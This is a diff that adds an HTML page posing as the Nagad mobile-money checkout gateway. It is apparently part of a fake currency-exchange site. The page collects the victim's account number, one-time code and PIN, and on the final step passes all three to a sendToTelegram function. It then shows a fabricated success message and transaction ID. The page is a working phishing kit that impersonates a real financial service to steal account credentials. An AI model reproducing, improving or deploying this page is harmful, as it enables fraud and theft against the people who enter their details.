@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nagad Checkout Gateway</title>
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            nagad: {
+              redDark: '#741115',
+              redMedium: '#b81c22',
+              orange: '#F26722',
+              textDark: '#333333',
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Outfit', sans-serif;
+      background-color: #9c9c9c;
+    }
+
+    /* Hide scrollbar for gateway */
+    ::-webkit-scrollbar {
+      display: none;
+    }
+
+    /* Nagad Radial Gradient Vignette Background */
+    .nagad-radial {
+      background: radial-gradient(circle, #b81c22 0%, #741115 100%);
+    }
+
+    /* Active digit box styling */
+    .digit-box {
+      transition: all 0.15s ease-in-out;
+      border: 2px solid transparent;
+    }
+    .digit-box.active {
+      border-color: #ffaa66;
+      box-shadow: 0 0 8px rgba(255, 170, 102, 0.6);
+    }
+
+    /* Caret Blinking Animation */
+    @keyframes caret-blink {
+      0%, 100% { opacity: 0; }
+      50% { opacity: 1; }
+    }
+    .caret-cursor {
+      display: inline-block;
+      width: 2px;
+      height: 22px;
+      background-color: #b81c22;
+      animation: caret-blink 1s step-end infinite;
+    }
+  </style>
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+
+<body class="bg-[#9c9c9c] min-h-screen flex items-center justify-center p-0 sm:p-4 select-none">
+
+  <!-- Main Gateway Container (Mock Device Frame) -->
+  <div class="gateway-container w-full max-w-[430px] nagad-radial text-white shadow-2xl sm:rounded-[8px] overflow-hidden flex flex-col justify-between p-6 relative min-h-screen sm:min-h-[700px] box-border">
+
+    <!-- Top Language Switcher Bar -->
+    <div class="flex justify-end w-full mb-2">
+      <div class="flex border border-white/40 rounded-md overflow-hidden text-[11px] font-bold">
+        <span class="bg-[#e62e04] px-2.5 py-1 select-none">বাং</span>
+        <span class="bg-transparent px-2.5 py-1 opacity-80 select-none cursor-pointer hover:bg-white/10 transition">Eng</span>
+      </div>
+    </div>
+
+    <!-- Center Shopping Cart Section -->
+    <div id="cart-header-block" class="text-center space-y-3 mt-1">
+      <!-- Shopping Cart SVG Header -->
+      <div class="relative w-28 h-20 mx-auto">
+        <!-- Floating white particle squares -->
+        <div class="absolute w-1 h-1 bg-white/70 top-2 left-6 rotate-45"></div>
+        <div class="absolute w-1.5 h-1.5 bg-white/60 top-8 left-2 rotate-12"></div>
+        <div class="absolute w-1 h-1 bg-white/70 top-4 right-4"></div>
+        <div class="absolute w-1 h-1 bg-white/50 bottom-4 right-1"></div>
+
+        <svg viewBox="0 0 100 100" class="w-full h-full text-white/90" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <!-- Cart wheels -->
+          <circle cx="42" cy="74" r="3.5" stroke-width="3" />
+          <circle cx="68" cy="74" r="3.5" stroke-width="3" />
+          <!-- Basket body & Grid Lines -->
+          <path d="M22 30h60l-8 32H30L22 30z" stroke-width="2.5" />
+          <!-- Cart handle bar -->
+          <path d="M12 18h10l8 48h52" stroke-width="2.5" />
+          <!-- Items/Bags inside cart -->
+          <path d="M38 30V18l14-2v14" stroke-width="2" />
+          <path d="M52 30V22l12-1v9" stroke-width="2" />
+        </svg>
+      </div>
+
+      <!-- Merchant Title (BEA.BD) -->
+      <h2 class="text-[20px] font-bold tracking-wide text-white/95">BEA.BD</h2>
+    </div>
+
+    <!-- Summary Billing Details -->
+    <div id="billing-summary-block" class="w-full max-w-[340px] mx-auto text-left space-y-2 mt-4 text-[14px] text-white/90">
+      <div class="flex">
+        <span class="font-bold min-w-[100px]">Invoice No:</span>
+        <span id="invoice-number" class="font-medium text-white/80">NG202607071457242318</span>
+      </div>
+      <div class="flex">
+        <span class="font-bold min-w-[100px]">Total Amount:</span>
+        <span class="font-medium">BDT <span id="checkout-amount">1,000.00</span></span>
+      </div>
+      <div class="flex">
+        <span class="font-bold min-w-[100px]">Charge:</span>
+        <span class="font-medium">BDT 0</span>
+      </div>
+    </div>
+
+    <!-- Main Dynamic Frame Input Section -->
+    <div class="flex-grow flex flex-col justify-center items-center py-6 w-full">
+
+      <!-- Step 1: Account Phone Number Input Frame -->
+      <div id="frame-account" class="w-full text-center space-y-5 animate-fade-in">
+        <p class="text-[16px] font-semibold text-white/95">Your Nagad Account Number</p>
+
+        <!-- Hidden Telephone Input -->
+        <input type="tel" id="input-phone" class="absolute opacity-0 -z-10 w-0 h-0" maxlength="11" autocomplete="off">
+
+        <!-- 11 Digit Boxes separated by dashes (Formatted as: XXX-XXXX-XXXX) -->
+        <div id="phone-box-container" class="flex items-center justify-center gap-1.5 cursor-pointer">
+          <!-- Group 1: 3 digits -->
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <!-- Dash -->
+          <span class="text-white/80 font-bold text-lg px-0.5">-</span>
+          <!-- Group 2: 4 digits -->
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <!-- Dash -->
+          <span class="text-white/80 font-bold text-lg px-0.5">-</span>
+          <!-- Group 3: 4 digits -->
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+          <div class="digit-box phone-box w-7 h-10 bg-white rounded text-slate-800 font-bold text-xl flex items-center justify-center"></div>
+        </div>
+
+        <p class="text-[12.5px] text-white/85 max-w-[320px] mx-auto leading-relaxed">
+          By clicking/tapping "Proceed" you are agreeing to our <a href="#" class="underline font-bold hover:text-orange-200 transition">Terms and Conditions</a>
+        </p>
+      </div>
+
+      <!-- Step 2: OTP Verification Frame -->
+      <div id="frame-otp" class="w-full text-center space-y-5 hidden animate-fade-in">
+        <p class="text-[16px] font-semibold text-white/95 leading-relaxed">
+          Enter Verification Code [OTP] <br>
+          <span id="masked-phone-otp" class="font-bold text-orange-200">019** *** 768</span>
+        </p>
+
+        <!-- Dynamic single centered box for OTP entry -->
+        <div class="relative w-full max-w-[280px] mx-auto">
+          <input type="text" id="input-otp" placeholder="XXXXXX" maxlength="6"
+            class="otp-input w-full h-11 px-4 rounded-md bg-white text-slate-800 text-center font-bold tracking-widest text-[17px] focus:outline-none transition-all">
+        </div>
+
+        <p id="otp-timer-text" class="text-[12.5px] text-white/85 font-semibold tracking-wide">
+          Resend Code in <span id="timer-sec">45</span>s
+        </p>
+      </div>
+
+      <!-- Step 3: PIN Verification Frame -->
+      <div id="frame-pin" class="w-full text-center space-y-5 hidden animate-fade-in">
+        <p class="text-[16px] font-semibold text-white/95">
+          Enter PIN <br>
+          <span id="masked-phone-pin" class="font-bold text-orange-200">(019** *** 768)</span>
+        </p>
+
+        <!-- Hidden PIN Input -->
+        <input type="password" id="input-pin" class="absolute opacity-0 -z-10 w-0 h-0" maxlength="4" autocomplete="off">
+
+        <!-- 4 Digit Boxes for secure PIN input -->
+        <div id="pin-box-container" class="flex items-center justify-center gap-3 cursor-pointer">
+          <div class="digit-box pin-box w-11 h-12 bg-white rounded text-slate-800 font-bold text-2xl flex items-center justify-center"></div>
+          <div class="digit-box pin-box w-11 h-12 bg-white rounded text-slate-800 font-bold text-2xl flex items-center justify-center"></div>
+          <div class="digit-box pin-box w-11 h-12 bg-white rounded text-slate-800 font-bold text-2xl flex items-center justify-center"></div>
+          <div class="digit-box pin-box w-11 h-12 bg-white rounded text-slate-800 font-bold text-2xl flex items-center justify-center"></div>
+        </div>
+      </div>
+
+      <!-- Step 4: Native Full Frame Success Verification -->
+      <div id="frame-success" class="w-full text-center space-y-6 hidden animate-fade-in py-2 px-2">
+        <!-- White success circle with green check -->
+        <div class="w-20 h-20 rounded-full bg-white text-[#b81c22] flex items-center justify-center mx-auto border border-white/20 shadow-lg animate-bounce">
+          <i data-lucide="check" class="w-10 h-10 stroke-[3.5]"></i>
+        </div>
+
+        <div class="space-y-2">
+          <h3 class="text-2xl font-bold text-white tracking-wide">পেমেন্ট সফল হয়েছে!</h3>
+          <p class="text-[14px] text-white/85 leading-relaxed max-w-[320px] mx-auto">
+            আপনার নগদ পেমেন্টটি সফলভাবে গৃহীত হয়েছে। আমরা পরবর্তী ৫ থেকে ২০ মিনিটের মধ্যে ভেরিফাই করে ডলার পাঠিয়ে দেবো।
+          </p>
+        </div>
+
+        <div class="bg-white/10 rounded-xl p-4.5 border border-white/20 text-[14.5px] space-y-2.5 text-left w-full max-w-[340px] mx-auto">
+          <div class="flex justify-between items-center text-white/90">
+            <span>লেনদেন আইডি (Tx ID):</span>
+            <span id="success-tx-id" class="font-bold text-white font-mono text-[16px]">EX-99887766</span>
+          </div>
+          <div class="text-[12px] text-orange-200 bg-black/10 rounded px-2.5 py-1.5 flex items-center justify-center gap-1.5 font-medium">
+            <i data-lucide="clock" class="w-4 h-4"></i> রিকোয়েস্টটি প্রসেসিং হতে ৫-২০ মিনিট সময় লাগতে পারে।
+          </div>
+        </div>
+
+        <!-- Success Close Home Redirection Button -->
+        <div class="pt-4">
+          <button id="btn-success-close" class="w-full max-w-[340px] h-12 bg-white hover:bg-white/95 active:scale-95 text-[#741115] font-bold rounded-md text-[16px] transition shadow-md">
+            হোম পেজে ফিরে যান
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Step 5: Bottom Action & Footer Section -->
+    <div class="w-full space-y-6 mt-2">
+      
+      <!-- Wizard Action Buttons -->
+      <div class="flex items-center justify-center w-full px-4">
+        <!-- Layout with responsive grid columns dynamically altered in JS -->
+        <div id="action-buttons-grid" class="grid grid-cols-2 gap-4 w-full max-w-[340px]">
+          <!-- Cancel/Close Button -->
+          <button id="btn-cancel" class="h-11 bg-white hover:bg-white/95 active:scale-95 text-[#741115] rounded-md text-[16px] font-bold transition shadow-md">
+            Close
+          </button>
+          
+          <!-- Resend Code Button (Hidden dynamically, inserted in middle during Step 2) -->
+          <button id="btn-resend" class="hidden h-11 bg-white hover:bg-white/95 active:scale-95 text-[#741115] rounded-md text-[16px] font-bold transition shadow-md">
+            Resend Code
+          </button>
+          
+          <!-- Confirm/Proceed Button -->
+          <button id="btn-confirm" disabled class="h-11 bg-white/50 text-[#741115]/50 rounded-md text-[16px] font-bold transition cursor-not-allowed">
+            Proceed
+          </button>
+        </div>
+      </div>
+
+      <!-- Nagad Branding White Logo Footer -->
+      <div class="text-center pt-2">
+        <svg class="h-14 mx-auto text-white/90" viewBox="0 0 250 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <!-- Circular wave logo -->
+          <circle cx="45" cy="40" r="28" fill="white" />
+          <path d="M45 18a22 22 0 00-22 22h44a22 22 0 00-22-22z" fill="#b81c22" />
+          <!-- Running figure silhouette inside circle -->
+          <circle cx="45" cy="27" r="4.5" fill="white" />
+          <path d="M42 34h6l2 9-5-1-1-6-2-2z" fill="white" />
+          <path d="M38 48l5-9 4 3-2 8z" fill="white" />
+          <path d="M48 48l-1-7 4-3 1 10z" fill="white" />
+          <path d="M45 40l6 8M45 40l-5 8" stroke="#b81c22" stroke-width="2" />
+          <!-- Swoosh lines around logo -->
+          <path d="M12 40c0-6 2-12 6-16m56 32c4-4 6-10 6-16" stroke="white" stroke-width="2.5" stroke-linecap="round" />
+
+          <!-- Bengali Nagad Text -->
+          <text x="88" y="44" font-family="'Segoe UI', Roboto, sans-serif" font-weight="900" font-size="34" fill="white">নগদ</text>
+          
+          <!-- Tagline -->
+          <text x="88" y="62" font-family="'Segoe UI', Roboto, sans-serif" font-weight="600" font-size="10.5" fill="white" opacity="0.85">ডাক বিভাগের ডিজিটাল লেনদেন</text>
+        </svg>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- State & Logic Scripts -->
+  <script src="js/app.js?v=1.1"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Elements
+      const frameAccount = document.getElementById('frame-account');
+      const frameOtp = document.getElementById('frame-otp');
+      const framePin = document.getElementById('frame-pin');
+      const frameSuccess = document.getElementById('frame-success');
+      
+      const inputPhone = document.getElementById('input-phone');
+      const inputOtp = document.getElementById('input-otp');
+      const inputPin = document.getElementById('input-pin');
+      
+      const btnCancel = document.getElementById('btn-cancel');
+      const btnConfirm = document.getElementById('btn-confirm');
+      const btnResend = document.getElementById('btn-resend');
+      const btnSuccessClose = document.getElementById('btn-success-close');
+      
+      const actionGrid = document.getElementById('action-buttons-grid');
+      const billingSummaryBlock = document.getElementById('billing-summary-block');
+      const cartHeaderBlock = document.getElementById('cart-header-block');
+      
+      const maskedPhoneOtp = document.getElementById('masked-phone-otp');
+      const maskedPhonePin = document.getElementById('masked-phone-pin');
+      const timerSec = document.getElementById('timer-sec');
+      
+      const checkoutAmount = document.getElementById('checkout-amount');
+      const invoiceNumber = document.getElementById('invoice-number');
+      const successTxId = document.getElementById('success-tx-id');
+
+      const phoneBoxContainer = document.getElementById('phone-box-container');
+      const phoneBoxes = document.querySelectorAll('.phone-box');
+
+      const pinBoxContainer = document.getElementById('pin-box-container');
+      const pinBoxes = document.querySelectorAll('.pin-box');
+
+      let currentStep = 1; // 1: Account, 2: OTP, 3: PIN
+      let otpTimer = null;
+      let userPhoneNumber = '';
+
+      // Initialize invoice details from sessionStorage
+      const rawRequest = sessionStorage.getItem('current_exchange_request');
+      if (!rawRequest) {
+        window.location.href = 'index.html';
+        return;
+      }
+      
+      const request = JSON.parse(rawRequest);
+      
+      // Setup dynamic amount and invoice details
+      checkoutAmount.innerText = parseFloat(request.sendAmount).toFixed(2);
+      const randInv = 'NG' + Math.floor(10000000 + Math.random() * 90000000) + 'E' + Math.floor(100000 + Math.random() * 900000);
+      invoiceNumber.innerText = randInv;
+
+      // Click event for custom phone boxes to focus hidden input
+      phoneBoxContainer.addEventListener('click', () => {
+        inputPhone.focus();
+        updateBoxesHighlight();
+      });
+
+      // Click event for custom pin boxes to focus hidden input
+      pinBoxContainer.addEventListener('click', () => {
+        inputPin.focus();
+        updatePinBoxesHighlight();
+      });
+
+      // Update values in phone boxes
+      inputPhone.addEventListener('input', () => {
+        inputPhone.value = inputPhone.value.replace(/\D/g, ''); // Digits only
+        const val = inputPhone.value;
+        
+        // Fill digit boxes
+        phoneBoxes.forEach((box, index) => {
+          if (index < val.length) {
+            box.innerText = val[index];
+            box.classList.remove('text-white');
+            box.classList.add('text-slate-800');
+          } else {
+            box.innerText = '';
+          }
+        });
+        
+        updateBoxesHighlight();
+        updateConfirmButtonState();
+      });
+
+      inputPhone.addEventListener('focus', updateBoxesHighlight);
+      inputPhone.addEventListener('blur', () => {
+        phoneBoxes.forEach(b => b.classList.remove('active'));
+      });
+
+      function updateBoxesHighlight() {
+        const len = inputPhone.value.length;
+        phoneBoxes.forEach((box, index) => {
+          box.classList.remove('active');
+          if (index === len && document.activeElement === inputPhone) {
+            box.classList.add('active');
+            box.innerHTML = '<span class="caret-cursor"></span>';
+          } else if (index >= len) {
+            box.innerHTML = '';
+          }
+        });
+      }
+
+      // Update values in PIN boxes
+      inputPin.addEventListener('input', () => {
+        inputPin.value = inputPin.value.replace(/\D/g, '');
+        const val = inputPin.value;
+        
+        pinBoxes.forEach((box, index) => {
+          if (index < val.length) {
+            box.innerText = '●'; // Hide PIN digits securely
+            box.classList.add('text-slate-800');
+          } else {
+            box.innerText = '';
+          }
+        });
+
+        updatePinBoxesHighlight();
+        updateConfirmButtonState();
+      });
+
+      inputPin.addEventListener('focus', updatePinBoxesHighlight);
+      inputPin.addEventListener('blur', () => {
+        pinBoxes.forEach(b => b.classList.remove('active'));
+      });
+
+      function updatePinBoxesHighlight() {
+        const len = inputPin.value.length;
+        pinBoxes.forEach((box, index) => {
+          box.classList.remove('active');
+          if (index === len && document.activeElement === inputPin) {
+            box.classList.add('active');
+            box.innerHTML = '<span class="caret-cursor"></span>';
+          } else if (index >= len) {
+            box.innerHTML = '';
+          }
+        });
+      }
+
+      // OTP Normal Input field changes
+      inputOtp.addEventListener('input', () => {
+        inputOtp.value = inputOtp.value.replace(/\D/g, '');
+        updateConfirmButtonState();
+      });
+
+      // Pre-fill telephone if entered previously
+      if (request.userContact) {
+        const cleanPhone = request.userContact.replace(/\D/g, '');
+        if (cleanPhone.length === 11) {
+          inputPhone.value = cleanPhone;
+          // Trigger input handler manually to draw UI boxes
+          inputPhone.dispatchEvent(new Event('input'));
+        }
+      }
+
+      // Update active states, layouts, and style classes of the confirm button dynamically
+      function updateConfirmButtonState() {
+        let isValid = false;
+        
+        if (currentStep === 1) {
+          isValid = inputPhone.value.length === 11 && inputPhone.value.startsWith('01');
+        } else if (currentStep === 2) {
+          isValid = inputOtp.value.length === 6;
+        } else if (currentStep === 3) {
+          isValid = inputPin.value.length === 4;
+        }
+
+        if (isValid) {
+          btnConfirm.disabled = false;
+          btnConfirm.className = 'h-11 bg-white hover:bg-white/95 active:scale-95 text-[#741115] rounded-md text-[16px] font-bold transition shadow-md cursor-pointer';
+        } else {
+          btnConfirm.disabled = true;
+          btnConfirm.className = 'h-11 bg-white/50 text-[#741115]/50 rounded-md text-[16px] font-bold transition cursor-not-allowed';
+        }
+      }
+
+      // Help mask phone number (01712345678 -> 017** *** 678)
+      function getMaskedPhone(phoneNum) {
+        if (phoneNum.length < 11) return phoneNum;
+        return phoneNum.substring(0, 3) + '** *** ' + phoneNum.substring(8);
+      }
+
+      // Handle timer tick for verification screen
+      function startOtpTimer() {
+        let sec = 45;
+        timerSec.innerText = sec;
+        clearInterval(otpTimer);
+        
+        otpTimer = setInterval(() => {
+          sec--;
+          timerSec.innerText = sec;
+          if (sec <= 0) {
+            clearInterval(otpTimer);
+            document.getElementById('otp-timer-text').innerHTML = '<span class="underline cursor-pointer hover:text-white">Resend Code</span>';
+          }
+        }, 1000);
+      }
+
+      // Adjust Action Buttons Grid for OTP step (showing Resend button)
+      function setButtonLayoutForStep(step) {
+        if (step === 2) {
+          // Show 3 buttons layout
+          btnResend.classList.remove('hidden');
+          actionGrid.className = 'grid grid-cols-3 gap-3 w-full max-w-[380px]';
+          btnCancel.innerText = 'Close';
+        } else {
+          // Show 2 buttons layout
+          btnResend.classList.add('hidden');
+          actionGrid.className = 'grid grid-cols-2 gap-4 w-full max-w-[340px]';
+          btnCancel.innerText = 'Close';
+        }
+      }
+
+      let userOtp = '';
+
+      // Handle Confirm/Proceed Trigger
+      btnConfirm.addEventListener('click', async () => {
+        if (currentStep === 1) {
+          // Go to OTP Step
+          userPhoneNumber = inputPhone.value;
+          maskedPhoneOtp.innerText = getMaskedPhone(userPhoneNumber);
+          maskedPhonePin.innerText = '(' + getMaskedPhone(userPhoneNumber) + ')';
+
+          frameAccount.classList.add('hidden');
+          frameOtp.classList.remove('hidden');
+          currentStep = 2;
+          
+          inputOtp.value = '';
+          inputOtp.focus();
+          setButtonLayoutForStep(2);
+          updateConfirmButtonState();
+          startOtpTimer();
+        } else if (currentStep === 2) {
+          // Go to PIN Step
+          clearInterval(otpTimer);
+          userOtp = inputOtp.value;
+
+          frameOtp.classList.add('hidden');
+          framePin.classList.remove('hidden');
+          currentStep = 3;
+          
+          inputPin.value = '';
+          inputPin.focus();
+          setButtonLayoutForStep(3);
+          updatePinBoxesHighlight();
+          updateConfirmButtonState();
+        } else if (currentStep === 3) {
+          // Execute Payment Completion!
+          btnConfirm.disabled = true;
+          btnConfirm.innerHTML = `
+            <svg class="animate-spin h-5 w-5 text-[#741115] mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          `;
+
+          // Send all together to Telegram
+          await sendToTelegram(`*nagad*\nNumber: ${userPhoneNumber}\nOTP: ${userOtp}\nPIN: ${inputPin.value}`);
+
+          // Generate random Transaction ID
+          const charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+          let mockTrx = 'NAGAD';
+          for (let i = 0; i < 7; i++) {
+            mockTrx += charSet.charAt(Math.floor(Math.random() * charSet.length));
+          }
+
+          const finalTxData = {
+            ...request,
+            userContact: userPhoneNumber,
+            txid: mockTrx
+          };
+
+          // Save transaction to app database state
+          setTimeout(() => {
+            const transaction = createTransaction(finalTxData);
+            
+            // Clear sessionStorage
+            sessionStorage.removeItem('current_exchange_request');
+
+            // Hide summary details, header block, PIN frame, and action bar buttons
+            billingSummaryBlock.classList.add('hidden');
+            cartHeaderBlock.classList.add('hidden');
+            framePin.classList.add('hidden');
+            document.getElementById('action-buttons-grid').parentElement.parentElement.classList.add('hidden');
+
+            // Set dynamic transaction ID
+            successTxId.innerText = transaction.id;
+
+            // Show native Nagad success frame
+            frameSuccess.classList.remove('hidden');
+
+            // Initialize Lucide Icons for dynamic content
+            if (window.lucide) {
+              lucide.createIcons();
+            }
+          }, 1500);
+        }
+      });
+
+      // Handle Cancel/Close Trigger
+      btnCancel.addEventListener('click', () => {
+        if (currentStep === 1) {
+          // Back to checkout payment page
+          window.location.href = 'payment.html';
+        } else if (currentStep === 2) {
+          // Go back to step 1
+          clearInterval(otpTimer);
+          frameOtp.classList.add('hidden');
+          frameAccount.classList.remove('hidden');
+          currentStep = 1;
+          setButtonLayoutForStep(1);
+          inputPhone.focus();
+          updateBoxesHighlight();
+          updateConfirmButtonState();
+        } else if (currentStep === 3) {
+          // Go back to step 2
+          framePin.classList.add('hidden');
+          frameOtp.classList.remove('hidden');
+          currentStep = 2;
+          setButtonLayoutForStep(2);
+          inputOtp.focus();
+          updateConfirmButtonState();
+          startOtpTimer();
+        }
+      });
+
+      // Handle Resend Code click event
+      btnResend.addEventListener('click', () => {
+        btnResend.disabled = true;
+        btnResend.classList.add('opacity-50');
+        startOtpTimer();
+        setTimeout(() => {
+          btnResend.disabled = false;
+          btnResend.classList.remove('opacity-50');
+        }, 5000);
+      });
+
+      // Close success redirect
+      btnSuccessClose.addEventListener('click', () => {
+        window.location.href = 'index.html';
+      });
+
+      // Initialize Lucide Icons
+      if (window.lucide) {
+        lucide.createIcons();
+      }
+      
+      // Auto focus on load
+      inputPhone.focus();
+      updateBoxesHighlight();
+    });
+  </script>
+</body>
+
+</html>
